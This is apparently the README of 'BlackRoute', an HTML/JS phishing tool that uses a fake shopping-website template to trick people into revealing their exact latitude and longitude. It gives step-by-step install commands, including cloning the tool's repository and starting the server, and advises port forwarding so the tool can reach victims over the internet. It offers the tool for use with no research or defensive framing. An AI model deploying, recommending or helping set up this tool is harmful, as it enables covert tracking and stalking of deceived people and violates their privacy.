## BlackRoute
Blackroute is a tool built in HTML and JS that helps to find the exact location (longitude and latitude) of the user with the help of phishing and social engineering and it uses a shopping website template that gives a real and authentic feel to the user.
## How To install 
1. sudo apt install nodejs npm express cors
2. git clone https://github.com/r3b00tm4st3r/BlackRoute.git
3. cd BlackRoute
4. npm install express
5. npm start

## Note
If you want to use this tool in a wide area network, you will need to do port forwarding first.
